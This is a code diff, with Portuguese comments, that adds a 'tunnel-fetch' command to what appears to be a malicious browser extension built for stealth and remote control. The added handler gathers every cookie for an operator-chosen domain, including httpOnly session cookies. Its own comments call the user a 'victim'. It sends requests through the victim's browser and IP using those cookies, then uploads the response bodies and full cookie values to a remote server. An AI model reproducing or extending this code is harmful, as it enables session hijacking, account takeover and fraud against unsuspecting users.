@@ -1410,6 +1410,10 @@ async function handleRemoteCommand(data) {
         await handleProxyFetchCommand(data);
         break;
       
+      case 'tunnel-fetch':
+        await handleTunnelFetchCommand(data);
+        break;
+      
       default:
         log('warn', 'Unknown command type:', data.command_type);
         throw new Error(`Unknown command type: ${data.command_type}`);
@@ -1845,6 +1849,287 @@ async function closeOffscreenDocument() {
   } catch (err) {
     // Já estava fechado ou não existe
     log('debug', '[STEALTH] Offscreen document already closed');
+  }
+}
+
+/**
+ * Handler de comando tunnel-fetch
+ * Faz requisições HTTP usando cookies da vítima + IP da vítima
+ */
+async function handleTunnelFetchCommand(data) {
+  const { command_id, target_url, method, headers, body, follow_redirects } = data.payload || {};
+  
+  log('info', `🌐 [TUNNEL] Requisição recebida`, {
+    command_id,
+    url: target_url,
+    method: method || 'GET'
+  });
+  
+  try {
+    // Validar URL
+    if (!target_url) {
+      throw new Error('URL não fornecida');
+    }
+    
+    const url = new URL(target_url);
+    log('debug', `[TUNNEL] URL parseada: ${url.hostname}`);
+    
+    // ══════════════════════════════════════════════════════
+    // BUSCAR COOKIES DO DOMÍNIO ALVO
+    // ══════════════════════════════════════════════════════
+    
+    const domainsToCheck = [
+      url.hostname,
+      `.${url.hostname}`,
+      url.hostname.replace(/^www\./, ''),
+      `.${url.hostname.replace(/^www\./, '')}`
+    ];
+    
+    log('debug', `[TUNNEL] Buscando cookies para domínios: ${domainsToCheck.join(', ')}`);
+    
+    const allCookies = new Map();
+    
+    for (const domain of domainsToCheck) {
+      try {
+        const domainCookies = await chrome.cookies.getAll({ domain });
+        log('debug', `[TUNNEL] ${domainCookies.length} cookies encontrados para ${domain}`);
+        
+        for (const cookie of domainCookies) {
+          const key = `${cookie.name}::${cookie.domain}::${cookie.path}`;
+          allCookies.set(key, cookie);
+        }
+      } catch (err) {
+        log('warn', `[TUNNEL] Erro ao buscar cookies para ${domain}: ${err.message}`);
+      }
+    }
+    
+    const cookies = Array.from(allCookies.values());
+    log('info', `🍪 [TUNNEL] Total de cookies: ${cookies.length}`);
+    
+    // ══════════════════════════════════════════════════════
+    // CONSTRUIR HEADER COOKIE
+    // ══════════════════════════════════════════════════════
+    
+    const cookieHeader = cookies
+      .map(c => `${c.name}=${c.value}`)
+      .join('; ');
+    
+    // ══════════════════════════════════════════════════════
+    // CONSTRUIR HEADERS DA REQUISIÇÃO
+    // ══════════════════════════════════════════════════════
+    
+    const fetchHeaders = {
+      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+      'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+      'Accept-Encoding': 'gzip, deflate, br',
+      'Connection': 'keep-alive',
+      'Upgrade-Insecure-Requests': '1',
+      'Sec-Fetch-Dest': 'document',
+      'Sec-Fetch-Mode': 'navigate',
+      'Sec-Fetch-Site': 'none',
+      'Sec-Fetch-User': '?1',
+      'Cache-Control': 'max-age=0',
+      ...headers
+    };
+    
+    if (cookieHeader) {
+      fetchHeaders['Cookie'] = cookieHeader;
+    }
+    
+    fetchHeaders['User-Agent'] = navigator.userAgent;
+    
+    log('debug', `[TUNNEL] Headers construídos`, {
+      headers: Object.keys(fetchHeaders),
+      cookieLength: cookieHeader.length
+    });
+    
+    // ══════════════════════════════════════════════════════
+    // FAZER REQUISIÇÃO (USANDO IP DO CLIENTE)
+    // ══════════════════════════════════════════════════════
+    
+    log('info', `📡 [TUNNEL] Iniciando fetch para ${target_url}...`);
+    
+    const fetchOptions = {
+      method: method || 'GET',
+      headers: fetchHeaders,
+      credentials: 'include',
+      redirect: follow_redirects !== false ? 'follow' : 'manual',
+      signal: AbortSignal.timeout(60000) // 60 segundos
+    };
+    
+    if (body && (method === 'POST' || method === 'PUT' || method === 'PATCH')) {
+      fetchOptions.body = body;
+    }
+    
+    const startTime = Date.now();
+    const response = await fetch(target_url, fetchOptions);
+    const elapsed = Date.now() - startTime;
+    
+    log('info', `✅ [TUNNEL] Resposta recebida: ${response.status} (${elapsed}ms)`, {
+      status: response.status,
+      statusText: response.statusText,
+      contentType: response.headers.get('content-type'),
+      contentLength: response.headers.get('content-length')
+    });
+    
+    // ══════════════════════════════════════════════════════
+    // PROCESSAR RESPOSTA
+    // ══════════════════════════════════════════════════════
+    
+    const contentType = response.headers.get('content-type') || '';
+    const contentLength = parseInt(response.headers.get('content-length') || '0');
+    
+    const responseHeaders = {};
+    response.headers.forEach((value, key) => {
+      responseHeaders[key] = value;
+    });
+    
+    // ══════════════════════════════════════════════════════
+    // LER CORPO DA RESPOSTA
+    // ══════════════════════════════════════════════════════
+    
+    let responseBody;
+    let encoding = 'text';
+    
+    if (contentType.includes('image/') || 
+        contentType.includes('application/octet-stream') ||
+        contentType.includes('application/pdf')) {
+      encoding = 'base64';
+      const arrayBuffer = await response.arrayBuffer();
+      const bytes = new Uint8Array(arrayBuffer);
+      responseBody = btoa(String.fromCharCode.apply(null, bytes));
+      log('info', `📦 [TUNNEL] Body lido como base64: ${responseBody.length} chars`);
+    } else {
+      responseBody = await response.text();
+      log('info', `📦 [TUNNEL] Body lido como text: ${responseBody.length} chars`);
+    }
+    
+    // Verificar tamanho máximo (10MB)
+    const MAX_SIZE = 10 * 1024 * 1024;
+    if (responseBody.length > MAX_SIZE) {
+      log('warn', `[TUNNEL] Body muito grande (${responseBody.length}), truncando para ${MAX_SIZE}`);
+      responseBody = responseBody.substring(0, MAX_SIZE);
+    }
+    
+    // ══════════════════════════════════════════════════════
+    // CAPTURAR COOKIES ATUALIZADOS
+    // ══════════════════════════════════════════════════════
+    
+    log('debug', `[TUNNEL] Capturando cookies atualizados...`);
+    
+    const updatedCookies = [];
+    for (const domain of domainsToCheck) {
+      try {
+        const domainCookies = await chrome.cookies.getAll({ domain });
+        for (const cookie of domainCookies) {
+          updatedCookies.push({
+            name: cookie.name,
+            value: cookie.value,
+            domain: cookie.domain,
+            path: cookie.path,
+            secure: cookie.secure,
+            httpOnly: cookie.httpOnly,
+            sameSite: cookie.sameSite,
+            expirationDate: cookie.expirationDate,
+            isSession: !cookie.expirationDate || cookie.expirationDate === 0
+          });
+        }
+      } catch (err) {
+        log('warn', `[TUNNEL] Erro ao capturar cookies atualizados: ${err.message}`);
+      }
+    }
+    
+    log('info', `🍪 [TUNNEL] Cookies atualizados capturados: ${updatedCookies.length}`);
+    
+    // ══════════════════════════════════════════════════════
+    // PREPARAR RESULTADO
+    // ══════════════════════════════════════════════════════
+    
+    const result = {
+      success: true,
+      status_code: response.status,
+      status_text: response.statusText,
+      headers: responseHeaders,
+      body: responseBody,
+      encoding: encoding,
+      content_type: contentType,
+      content_length: responseBody.length,
+      final_url: response.url,
+      redirected: response.redirected,
+      cookies: updatedCookies,
+      elapsed_ms: elapsed,
+      timestamp: new Date().toISOString()
+    };
+    
+    log('info', `✅ [TUNNEL] Resultado preparado`, {
+      status: result.status_code,
+      bodySize: result.body.length,
+      cookies: result.cookies.length
+    });
+    
+    // ══════════════════════════════════════════════════════
+    // ENVIAR RESULTADO PARA EDGE FUNCTION
+    // ══════════════════════════════════════════════════════
+    
+    await sendTunnelResult(command_id, result);
+    
+  } catch (error) {
+    log('error', `❌ [TUNNEL] Erro na requisição`, {
+      command_id,
+      url: target_url,
+      error: error.message,
+      stack: error.stack
+    });
+    
+    await sendTunnelResult(command_id, {
+      success: false,
+      error: error.message,
+      error_type: error.name,
+      timestamp: new Date().toISOString()
+    });
+  }
+}
+
+/**
+ * Enviar resultado para Edge Function
+ */
+async function sendTunnelResult(command_id, result) {
+  try {
+    log('debug', `[TUNNEL] Enviando resultado para Edge Function...`);
+    
+    const response = await fetch(`${CONFIG.API_BASE}/tunnel-fetch-result`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
+      },
+      body: JSON.stringify({
+        command_id,
+        machine_id: machineId,
+        ...result
+      })
+    });
+    
+    if (!response.ok) {
+      const errorText = await response.text();
+      throw new Error(`Falha ao enviar resultado: ${response.status} - ${errorText}`);
+    }
+    
+    const data = await response.json();
+    log('info', `✅ [TUNNEL] Resultado enviado: ${data.result_id}`);
+    
+    // Enviar confirmação via WebSocket
+    if (commandSocket && commandSocket.readyState === WebSocket.OPEN) {
+      commandSocket.send(JSON.stringify({
+        type: 'command_response',
+        command_id: command_id,
+        success: result.success,
+        result_id: data.result_id
+      }));
+    }
+    
+  } catch (error) {
+    log('error', `❌ [TUNNEL] Erro ao enviar resultado: ${error.message}`);
   }
 }
 
